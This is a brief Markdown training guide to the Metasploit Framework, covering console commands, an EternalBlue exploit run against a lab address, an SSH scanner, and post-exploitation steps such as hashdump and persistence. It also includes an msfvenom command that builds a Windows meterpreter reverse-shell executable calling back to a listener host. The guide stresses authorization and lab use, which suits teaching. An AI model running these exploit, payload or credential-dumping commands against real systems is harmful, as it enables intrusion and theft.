# Metasploit Framework

## Overview

Metasploit is an exploitation framework used for vulnerability validation, post-exploitation modules, payload generation, and controlled attack simulation.

Use only with explicit authorization.

---

## Starting Metasploit

```bash
msfconsole
```

Database initialization (environment-specific):

```bash
msfdb init
```

---

## Core Console Commands

- `search <term>`
- `use <module>`
- `show options`
- `set <option> <value>`
- `run` or `exploit`
- `sessions -l`
- `sessions -i <id>`

---

## Typical Exploit Workflow

1. Identify vulnerable service/version.
2. Select matching exploit module.
3. Configure required options (`RHOSTS`, `RPORT`, etc.).
4. Configure payload and listener if needed.
5. Run module and validate result.
6. Document evidence and clean up.

---

## Example Flow

```bash
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.20
set LHOST 10.10.10.5
set LPORT 4444
run
```

---

## Auxiliary Modules

Auxiliary modules are useful for safe checks and enumeration.

```bash
search auxiliary scanner
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 10.10.10.0/24
run
```

---

## Payload Generation (msfvenom)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o payload.exe
```

Handle payload work carefully and only in permitted labs.

---

## Post-Exploitation Basics

- `sysinfo`
- `getuid`
- `hashdump` (authorized contexts only)
- privilege escalation modules
- persistence modules (lab/testing only)

---

## OPSEC and Safety

- Prefer validation over aggressive exploitation
- Avoid unstable exploit modules in production environments
- Log every action and timestamp
- Reset/cleanup test artifacts

---

## Practice Tasks

1. Use auxiliary scanners for service enumeration.
2. Validate one known lab vulnerability with Metasploit.
3. Capture session evidence and module output.
4. Compare manual exploit vs framework-based workflow.
5. Create remediation notes from exploit findings.
